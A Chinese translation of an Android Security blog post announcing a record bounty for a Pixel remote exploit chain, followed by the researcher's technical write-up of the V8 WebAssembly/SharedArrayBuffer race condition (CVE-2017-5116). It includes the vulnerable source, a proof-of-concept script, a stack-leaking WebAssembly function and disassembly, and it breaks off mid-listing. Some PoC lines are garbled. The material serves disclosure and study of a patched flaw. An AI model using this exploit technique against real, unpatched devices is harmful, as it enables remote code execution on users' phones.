# Android 安全生态投资系统为Pixel支付奖励金
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
2017年6月，Android安全团队提高了Android漏洞奖励计划（ASR）的最高奖金额度，并与研究人员一起简化了漏洞提交流程。2017年8月，奇虎360科技有限公司Alpha团队的龚广，提交了自ASR项目开展以来第一个有效的远程利用链。龚广提交了详细的报告，因此被授予105000美元的奖励，这是有史以来ASR最高的奖励，同时也获得Chrome奖励项目的7500美元奖金，总共112500美元。这一整套安全问题，作为2017年12月份的安全更新中的一部分，已经被修复。安全补丁级别为2017-12-05或更高版本的设备将不受影响。
所有的使用A/B(无缝)系统更新的pixel设备或者合作合伙设备将自动安装这些更新，用户需要重新启动设备来完成更新。
Android安全团队要感谢龚广以及研究者社区对Android安全的贡献。如果你想参与Android漏洞奖励计划，可以查看[项目规则](https://www.google.com/about/appsecurity/android-rewards/)。有关如何提交报告的提示，请参阅[Bug Hunter
University](https://sites.google.com/site/bughunteruniversity/improve/how-to-submit-an-android-platform-bug-report)。
以下是奇虎360公司Alpha团队的龚广提交的安全报告。
## Pixel远程攻击链的技术细节
Pixel 手机受到多个层面的安全保护，是2017 Mobile Pwn2Own
比赛中唯一没有被攻破的设备。但是，2017年8月，我们团队发现了一个远程攻击链——这是ASR项目开展以来的首个远程有效利用。感谢Android安全团队在漏洞处理过程中的快速响应和帮助。
这篇文章涵盖了漏洞利用链的技术细节。利用链使用了两个漏洞，CVE-2017-5116 和
CVE-2017-14904，CVE-2017-5116是V8引擎漏洞，用于在Chrome沙箱渲染进程中获得代码执行。CVE-2017-14904是Android里libgmalloc模块中的一个bug，用于逃逸Chrome的沙箱。将两者结合，通过在Chrome浏览器里访问一个恶意的连接，该攻击链可以往系统服务进程注入任意代码。如果想要重现漏洞利用，下面是一个包含漏洞的环境：
Chrome 60.3112.107 + Android 7.1.2 (Security patch level 2017-8-05)
(google/sailfish/sailfish:7.1.2/NJH47F/4146041:user/release-keys)。
## RCE漏洞(CVE-2017-5116)
新功能通常会带来新的问题。V8 6.0版本引入了对SharedArrayBuffer的支持，它是JavaScript
worker线程用来共享内存的一种底层机制。SharedArrayBuffer 使 JavaScript
能够原子的、互斥的访问共享内存。WebAssembly是一种可以在现代Web浏览器中运行的新类型的代码，它是一种低级汇编式语言，具有紧凑的二进制格式，以接近原生代码的性能运行，并提供语言（如C/C++）编译功能，以便他们可以在web上运行。
结合Chrome的三个特性，SharedArrayBuffer、 WebAssembly以及web
worker，通过条件竞争，可以触发越界访问。简单来讲，WebAssembly代码可以被放进
SharedArrayBuffer，将SharedArrayBuffer传送给web
worker，当主线程解析WebAssembly代码的时候，worker线程可以修改这个代码，从而导致越界访问。
漏洞代码在函数GetFirstArgumentAsBytes中，函数参数可以是ArrayBuffer或者TypedArray 对象。
SharedArrayBuffer 引入 JavaScript 之后，TypedArray可以使用
SharedArrayBuffer作为存储结构，因此其他worker线程在任何时候都可能修TypedArray中的内容。
    i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo& args, ErrorThrower* thrower) {
    ......
    } else if (source->IsTypedArray()) {
         //--->source should be checked if it's backed by a SharedArrayBuffer
        // A TypedArray was passed.
        Local array = Local::Cast(source);
        Local buffer = array->Buffer();
        ArrayBuffer::Contents contents = buffer->GetContents();
        start =reinterpret_cast(contents.Data()) + array->ByteOffset();
        length = array->ByteLength();
    }
    ......
    return i::wasm::ModuleWireBytes(start, start + length);
    }
一个简单的PoC如下：
    poc
    function getSharedTypedArray(){
    var wasmarr = [
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
    0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
    0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
    0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
    0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
    0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];
    var sb = new SharedArrayBuffer(wasmarr.length);
    //---> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i 2)create a web worker
    var sta = getSharedTypedArray();
    worker.postMessage(sta.buffer);
    //--->3)pass the WebAssembly code to the web worker
    setTimeout(function(){
    while(1){
        try{
            sta[51]=0;
            var myModule = new WebAssembly.Module(sta); //--->4)parse the WebAssembly code
            var myInstance = new WebAssembly.Instance(myModule);
            //myInstance.exports.getAnswerPlus1();
        }catch(e){
    }
    }
    },1000);
    //worker.terminate();
WebAssembly代码的文本格式如下：
    00002b func[0]:
    00002d: 41 2a                      | i32.const 42
    00002f: 0b                         | end
    000030 func[1]:
    000032: 10 00                      | call 0
    000034: 41 01                      | i32.const 1
    000036: 6a                         | i32.add
    000037: 0b                         | end
首先，把上面二进制格式的WebAssembly代码放进一个 SharedArrayBuffer，然后创建一个
TypedArray数组，并且使用包含WebAssembly代码的SharedArrayBuffer作为其缓冲区。之后，创建一个worker线程，并且将SharedArrayBuffer传入这个新创建的worker
线程。当主线程解析 WebAssembly代码的同时，worker 线程修改SharedArrayBuffer的内容。
在这种情况下，条件竞争引发了[TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use)问题。主线程边界检测完成之后，指令”call
0″ 可以被worker 线程修改为”call 128″，当主线程解析并且编译WebAssembly代码时，越界访问就会发生。
由于 “call 0” 指令可以被修改为任何其他的WebAssembly函数，因此漏洞利用非常简单。 如果 “call 0” 被修改为 “call
$leak”，寄存器和栈上的内容将会被泄漏到到Web Assembly内存中。由于函数 “0” 和函数
“$leak”的参数个数不同，这将导致栈上许多有用的数据被泄露。
    (func $leak(param i32 i32 i32 i32 i32 i32)(result i32)
        i32.const 0
        get_local 0
        i32.store
        i32.const 4
        get_local 1
        i32.store
        i32.const 8
        get_local 2
        i32.store
        i32.const 12
        get_local 3
        i32.store
        i32.const 16
        get_local 4
        i32.store
        i32.const 20
        get_local 5
        i32.store
        i32.const 0
      ))
不仅仅是 “call 0” 指令可以被修改，任何 “call funcx” 指令都可以被修改。假设 funcx
是一个带有6个参数的如下函数，当V8在ia32架构下编译的时候，前5个参数通过寄存器传递，第六个参数通过栈传递。所有的参数值可以通过 JavaScript
被设置为任何值。
    /*Text format of funcx*/
     (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)
        get_local 5
        get_local 4
        i32.add)
    /*Disassembly code of funcx*/
    --- Code ---    kind = WASM_FUNCTION
    name = wasm#1
    compiler = turbofan
    Instructions (size = 20)
    0x58f87600     0  8b442404       mov eax,[esp+0x4]
    0x58f87604     4  03c6           add eax,esi
    0x58f87606     6  c20400         ret 0x4
    0x58f87609     9  0f1f00         nop
    Safepoints (size = 8)
    RelocInfo (size = 0)
    --- End code ---    
当 JavaScript 调用 WebAssembly 函数的时候，v8编译器在内部创建一个 JS_TO_WASM 函数，编译完之后，JavaScript
函数将会调用创建的 JS_TO_WASM 函数，然后 JS_TO_WASM 将会调用 WebAssembly 函数。JS_TO_WASM
使用不同的调用方式，它的第一个参数是通过栈传递的。如果 “call funcx” 被修改为如下 JS_TO_WASM 函数，
    /*Disassembly code of JS_TO_WASM function */
    --- Code ---    kind = JS_TO_WASM_FUNCTION
    name = js-to-wasm#0
    compiler = turbofan
    Instructions (size = 170)
    0x4be08f20     0  55             push ebp
    0x4be08f21     1  89e5           mov ebp,esp
    0x4be08f23     3  56             push esi
    0x4be08f24     4  57             push edi
    0x4be08f25     5  83ec08         sub esp,0x8